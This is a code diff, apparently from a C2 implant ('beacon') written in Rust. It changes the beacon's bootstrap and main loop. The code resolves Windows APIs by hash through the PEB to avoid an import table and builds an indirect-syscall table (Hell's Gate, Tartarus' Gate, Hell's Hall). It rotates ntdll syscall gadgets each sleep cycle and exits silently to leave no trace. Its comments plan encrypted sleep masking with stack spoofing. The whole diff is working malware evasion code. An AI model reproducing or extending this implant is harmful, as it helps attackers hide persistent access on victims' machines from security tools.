@@ -1,11 +1,13 @@
 //! Beacon bootstrap and main cycle (port of `src_beacon/src/runtime/`).
 //!
 //! `spt_main`: resolve the core modules and APIs by FNV-64 hash through the
-//! PEB (no import table), store the instance in
+//! PEB (no import table), build the indirect-syscall table (Hell's Gate /
+//! Tartarus' Gate / Hell's Hall), store the instance in
 //! `TEB->NtTib.ArbitraryUserPointer` (no globals, fully reentrant), run the
-//! killswitch check, then loop on sleep cycles with jitter (phase 2 replaces
-//! the plain `Sleep` with the obfuscated sleep mask and the check-in
-//! transport).
+//! killswitch check, then loop on obfuscated-by-indirection sleep cycles
+//! with jitter (`NtDelayExecution` through a rotating ntdll gadget — the
+//! `syscall` instruction never runs from beacon memory). Exits are silent
+//! through `RtlExitUserThread(0)`.
 
 use core::ffi::c_void;
 
@@ -15,7 +17,10 @@ use specter_core::heap::{self, GetProcessHeapFn, HeapAllocFn, HeapFreeFn};
 use specter_core::peb::{self, Peb};
 use specter_core::rng::XorShift64;
 use specter_core::sleep::sleep_with_jitter;
+use specter_core::syscalls::{ms_to_delay_interval, pick_gadget};
 use specter_core::time::{filetime_to_unix_epoch, is_expired};
+
+use crate::runtime::syscalls::{self, Syscalls};
 
 /// Beacon instance (port of `SPT_INSTANCE`): the single per-beacon state,
 /// stored in `TEB->NtTib.ArbitraryUserPointer` and passed explicitly to
@@ -24,9 +29,12 @@ pub struct Instance {
     pub watermark: u32,
     pub ntdll: *mut c_void,
     pub kernel32: *mut c_void,
-    pub heap: heap::Heap,
-    pub sleep: unsafe extern "system" fn(u32),
+    /// Process heap: `None` when the kernel32 trio did not resolve (the
+    /// heap is optional until phase 3 buffering needs it).
+    pub heap: Option<heap::Heap>,
+    pub syscalls: Syscalls,
     pub get_system_time_as_file_time: unsafe extern "system" fn(*mut u64),
+    pub exit_thread: unsafe extern "system" fn(u32),
     pub rng: XorShift64,
 }
 
@@ -35,11 +43,13 @@ pub struct Instance {
 const H_NTDLL: u64 = fnv1a64_wide_ascii_ci("ntdll.dll");
 const H_KERNEL32: u64 = fnv1a64_wide_ascii_ci("kernel32.dll");
 
+/// ntdll export hashes.
+const H_RTL_EXIT_USER_THREAD: u64 = fnv1a64(b"RtlExitUserThread");
+
 /// kernel32 export hashes.
 const H_GET_PROCESS_HEAP: u64 = fnv1a64(b"GetProcessHeap");
 const H_HEAP_ALLOC: u64 = fnv1a64(b"HeapAlloc");
 const H_HEAP_FREE: u64 = fnv1a64(b"HeapFree");
-const H_SLEEP: u64 = fnv1a64(b"Sleep");
 const H_GET_SYSTEM_TIME_AS_FILE_TIME: u64 = fnv1a64(b"GetSystemTimeAsFileTime");
 const H_QUERY_PERFORMANCE_COUNTER: u64 = fnv1a64(b"QueryPerformanceCounter");
 
@@ -97,7 +107,7 @@ pub unsafe fn instance() -> *mut Instance {
 
 /// Resolve the modules and APIs the beacon needs and build the instance.
 /// Returns `None` when anything essential is missing — the caller must then
-/// exit silently.
+/// exit silently (or spin if even the exit is unresolvable).
 unsafe fn bootstrap() -> Option<Instance> {
     let peb = get_peb();
     let ntdll = peb::find_module(peb, H_NTDLL);
@@ -106,42 +116,56 @@ unsafe fn bootstrap() -> Option<Instance> {
         return None;
     }
 
+    // Silent exit first: everything else may fail and must still be able
+    // to leave without a trace.
+    let exit_thread_ptr = peb::find_export(ntdll, H_RTL_EXIT_USER_THREAD);
+    if exit_thread_ptr.is_null() {
+        return None;
+    }
+    let exit_thread = *(exit_thread_ptr as *const unsafe extern "system" fn(u32));
+
+    // Indirect syscall table (gadgets + NtDelayExecution SSN).
+    let syscall_table = syscalls::build(ntdll)?;
+
+    let get_time_ptr = peb::find_export(kernel32, H_GET_SYSTEM_TIME_AS_FILE_TIME);
+    let qpc_ptr = peb::find_export(kernel32, H_QUERY_PERFORMANCE_COUNTER);
     let get_process_heap = peb::find_export(kernel32, H_GET_PROCESS_HEAP);
     let heap_alloc = peb::find_export(kernel32, H_HEAP_ALLOC);
     let heap_free = peb::find_export(kernel32, H_HEAP_FREE);
-    let sleep = peb::find_export(kernel32, H_SLEEP);
-    let get_time = peb::find_export(kernel32, H_GET_SYSTEM_TIME_AS_FILE_TIME);
-    let qpc = peb::find_export(kernel32, H_QUERY_PERFORMANCE_COUNTER);
-    if get_process_heap.is_null()
-        || heap_alloc.is_null()
-        || heap_free.is_null()
-        || sleep.is_null()
-        || get_time.is_null()
-        || qpc.is_null()
-    {
+    if get_time_ptr.is_null() || qpc_ptr.is_null() {
         return None;
     }
 
     // Seed the jitter RNG from the performance counter; a failed read falls
     // back to the remapped zero seed (never zero-stuck).
     let mut counter: i64 = 0;
-    let rng = if (*(qpc as *const unsafe extern "system" fn(*mut i64) -> i32))(&mut counter) != 0 {
-        XorShift64::new(counter as u64)
+    let rng =
+        if (*(qpc_ptr as *const unsafe extern "system" fn(*mut i64) -> i32))(&mut counter) != 0 {
+            XorShift64::new(counter as u64)
+        } else {
+            XorShift64::new(0)
+        };
+
+    // The heap is optional at this stage (first use is phase 3 file/wire
+    // buffering): a missing Heap trio is not fatal.
+    let heap = if get_process_heap.is_null() || heap_alloc.is_null() || heap_free.is_null() {
+        None
     } else {
-        XorShift64::new(0)
+        Some(heap::Heap {
+            handle: (*(get_process_heap as *const GetProcessHeapFn))(),
+            alloc: *(heap_alloc as *const HeapAllocFn),
+            free: *(heap_free as *const HeapFreeFn),
+        })
     };
 
     Some(Instance {
         watermark: config::WATERMARK,
         ntdll,
         kernel32,
-        heap: heap::Heap {
-            handle: (*(get_process_heap as *const GetProcessHeapFn))(),
-            alloc: *(heap_alloc as *const HeapAllocFn),
-            free: *(heap_free as *const HeapFreeFn),
-        },
-        sleep: *(sleep as *const unsafe extern "system" fn(u32)),
-        get_system_time_as_file_time: *(get_time as *const unsafe extern "system" fn(*mut u64)),
+        heap,
+        syscalls: syscall_table,
+        get_system_time_as_file_time: *(get_time_ptr as *const unsafe extern "system" fn(*mut u64)),
+        exit_thread,
         rng,
     })
 }
@@ -162,8 +186,9 @@ unsafe fn now_epoch(instance: &Instance) -> u64 {
 pub unsafe fn main() -> ! {
     let mut instance = match bootstrap() {
         Some(instance) => instance,
-        // Essential resolution failed: exit silently (phase 2 replaces this
-        // with RtlExitUserThread(0) resolved by hash).
+        // Essential resolution failed. If even the silent exit is
+        // unresolvable there is no clean option: freeze without touching
+        // anything else.
         None => loop {
             core::hint::spin_loop();
         },
@@ -174,17 +199,27 @@ pub unsafe fn main() -> ! {
         // Killswitch: checked once here (bootstrap, before any network
         // activity) and again after every sleep cycle.
         if config::KILL_EPOCH != 0 && is_expired(config::KILL_EPOCH, now_epoch(&instance)) {
-            break;
+            syscalls::exit_thread(instance.exit_thread);
         }
-        let r = instance.rng.next_u32();
-        let ms = sleep_with_jitter(config::SLEEP_MS, config::JITTER_MS, r);
-        // Phase 1: plain Sleep; phase 2 replaces it with the obfuscated
-        // sleep mask (Ekko/Astral) and gadget rotation.
-        (instance.sleep)(ms);
-    }
 
-    // Expired killswitch: exit silently (same placeholder as above).
-    loop {
-        core::hint::spin_loop();
+        // Jittered sleep interval (phase 2 remainder: the encrypted sleep
+        // mask with heap/stack spoofing replaces the plain interval).
+        let ms = sleep_with_jitter(config::SLEEP_MS, config::JITTER_MS, instance.rng.next_u32());
+
+        // Hell's Hall: a new gadget every cycle, so the syscall never
+        // executes from the same ntdll address twice in a row.
+        let g = pick_gadget(instance.syscalls.gadget_count, instance.rng.next_u32());
+        let gadget = syscalls::gadget(&instance.syscalls, g);
+
+        // NtDelayExecution(Alertable = FALSE, DelayInterval = relative).
+        let mut interval = ms_to_delay_interval(ms);
+        let status = syscalls::indirect_syscall2(
+            instance.syscalls.delay_ssn,
+            gadget,
+            0,
+            &mut interval as *mut i64 as usize,
+        );
+        // A failing sleep is not fatal: keep the cycle going.
+        let _ = status;
     }
 }
